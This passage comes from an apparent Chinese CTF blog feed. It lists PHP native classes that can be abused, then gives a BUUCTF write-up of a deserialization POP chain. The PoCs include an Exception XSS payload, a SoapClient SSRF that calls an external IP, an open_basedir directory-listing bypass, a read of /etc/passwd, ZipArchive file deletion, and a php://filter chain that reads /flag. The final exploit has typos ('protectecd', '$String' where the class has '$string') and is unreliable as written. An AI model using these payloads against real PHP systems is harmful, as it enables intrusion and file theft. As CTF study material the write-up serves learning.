href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h3 id="使用Exception类构造xss"><a href="#使用Exception类构造xss" class="headerlink" title="使用Exception类构造xss"></a>使用Exception类构造xss</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215153244269.png" alt="image-20231215153244269"></p><h1 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h1><p>SoapClinet是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问web服务的PHP客户端</p><p><strong>类摘要</strong></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs smali">SoapClient &#123;<br>    /* 方法 */<br>   <span class="hljs-keyword"> public</span> __construct ( string|null $wsdl ,<span class="hljs-built_in"> array </span>$options = [] )<br>   <span class="hljs-keyword"> public</span> __call ( string $name ,<span class="hljs-built_in"> array </span>$args )<span class="hljs-keyword"> :</span> mixed<br>   <span class="hljs-keyword"> public</span> __doRequest ( string $request , string $location , string $action ,<span class="hljs-built_in"> int </span>$version , bool $oneWay = false )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getCookies ( )<span class="hljs-keyword"> :</span><span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> public</span> __getFunctions ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __getLastRequest ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastRequestHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponse ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getLastResponseHeaders ( )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __getTypes ( )<span class="hljs-keyword"> :</span> array|null<br>   <span class="hljs-keyword"> public</span> __setCookie ( string $name , string|null $value = null )<span class="hljs-keyword"> :</span> void<br>   <span class="hljs-keyword"> public</span> __setLocation ( string $location = <span class="hljs-string">&quot;&quot;</span> )<span class="hljs-keyword"> :</span> string|null<br>   <span class="hljs-keyword"> public</span> __setSoapHeaders ( SoapHeader|array|null $headers = null )<span class="hljs-keyword"> :</span> bool<br>   <span class="hljs-keyword"> public</span> __soapCall ( string $name ,<span class="hljs-built_in"> array </span>$args , array|null $options = null , SoapHeader|array|null $inputHeaders = null ,<span class="hljs-built_in"> array </span>&amp;$outputHeaders = null )<span class="hljs-keyword"> :</span> mixed<br>&#125;<br></code></pre></td></tr></table></figure><p>当__call方法被触发后，可以发送http和https请求。</p><p>该类构造函数如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><ul><li>第一个参数用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式</li><li>第二个参数为一个数组，如果在wsdl模式下，该参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是将请求发送到SOAP服务器的URL，uri则是SOAP服务的目标命名空间。</li></ul><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于环境问题，没有用nc演示</p><h1 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h1><p>Directorylterator类提供了一个用于查看文件系统目录内容的简单接口</p><p>Directorylterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可用来列举指定目录下的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*即可列出根目录下的文件</p><p><img src="/../images/image-20231215161339993.png" alt="image-20231215161339993"></p><h1 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h1><p>与Directorylterator类相同，提供了一个用于查看文件系统目录内容的简单接口</p><p>该类的构造方法将会创建一个指定目录的迭代器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h1 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h1><p>与filesystemlterator和directorylterator作用类似，也可以遍历一个文件目录，使用方法与前两个也类似</p><p>不同的是其行为类似glob()，可以通过模式匹配来寻找文件路径</p><p><strong>类摘要</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-comment">/* 继承的方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p>当我们知道flag文件在根目录，但是不知道flag文件的完整名，可以使用Globlterator(&#x2F;<em>flag</em>&#x2F;)</p><p><img src="/../images/20210809203839.png" alt="image-20210809203750996"></p><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>用于解析XML文档中的元素</p><p>官方文档对SimpleXMLElement类构造方法SimpleXMLElement::__construct定义：</p><p><img src="/../images/image-20231215162830705.png" alt="image-20231215162830705"></p><p><img src="/../images/image-20231215162844688.png" alt="image-20231215162844688"></p><p>可以看到第三个参数data_is_url为true，我们可以实现远程xml文件的载入</p><p>第二个参数的常量值我们设置为2即可</p><p>第一个参数data就是我们自己设置的payload的url地址，用于引入外部实体的url</p><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><ul><li>PHP5,7,8</li></ul><p>SplFileInfo类为单个文件的信息提供了高级的面向对象接口</p><p>SplFileInfo::__toString  将文件路径作为字符串返回</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>SplFileObject类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等</p><p>该类的构造方法可以构造一个新的文件对象用于后续的读取</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><ul><li>PHP&gt;5</li></ul><p>可以对文件进行压缩与解压缩</p><ul><li><code>ZipArchive::addEmptyDir</code>：添加一个新的文件目录</li><li><code>ZipArchive::addFile</code>：将文件添加到指定zip压缩包中</li><li><code>ZipArchive::addFromString</code>：添加新的文件同时将内容添加进去</li><li><code>ZipArchive::close</code>：关闭ziparchive</li><li><code>ZipArchive::extractTo</code>：将压缩包解压</li><li><code>ZipArchive::open</code>：打开一个zip压缩包</li><li><code>ZipArchive::deleteIndex</code>：删除压缩包中的某一个文件，如：<code>deleteIndex(0)</code>代表删除第一个文件</li><li><code>ZipArchive::deleteName</code>：删除压缩包中的某一个文件名称，同时也将文件删除</li></ul><p>来看看ZipArchive::open方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>该方法用来打开一个新的或现有的zip存档进行读取、写入、修改</p><ul><li><code>$filename</code>：要打开的ZIP存档的文件名。</li><li><code>$flags</code>：用于打开档案的模式。有以下几种模式：</li><li><code>ZipArchive::OVERWRITE</code>：总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖或删除。</li><li><code>ZipArchive::CREATE</code>：如果不存在则创建一个zip压缩包。</li><li><code>ZipArchive::RDONLY</code>：只读模式打开压缩包。</li><li><code>ZipArchive::EXCL</code>：如果压缩包已经存在，则出错。</li><li><code>ZipArchive::CHECKCONS</code>：对压缩包执行额外的一致性检查，如果失败则显示错误。</li></ul><p>如果设置flags值为ZipArchive::OVERWRITE的话，可以删除指定文件</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$a</span> = new Zip<span class="hljs-params">Archive</span>()<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-literal">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-title function_">ZipArchive::OVERWRITE</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;新生赛遇到了一道题需要利用PHP原生类，由于自己很菜，花了很长时间才做出来。趁周末有时间总结一下常见的PHP原生类&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题(持续更新)</title>
    <link href="http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-12-11T13:23:16.000Z</published>
    <updated>2023-12-19T12:51:33.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p>直接审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><p>首先找可以利用的点</p><p>发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//包含</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>存在文件包含，再找哪里调用了append()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要触发__invoke()方法，就能调用append()函数，并且传参var</p><p>要触发__invoke()方法必须使对象被当作函数调用</p><p><strong>Make_a_Change</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里把$function当作函数调用，但是要触发__get()方法，需要<strong>访问一个对象不存在或不可访问的属性</strong></p><p><strong>Road_is_Long</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果$this-&gt;string&#x3D;Make_a_Change的话，那么Make_a_Change-&gt;page也就访问了其不存在的属性</p><p>触发__toString()需要<strong>类被当作字符串</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//反序列化后执行</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">protectecd <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;effort=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;String=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h1 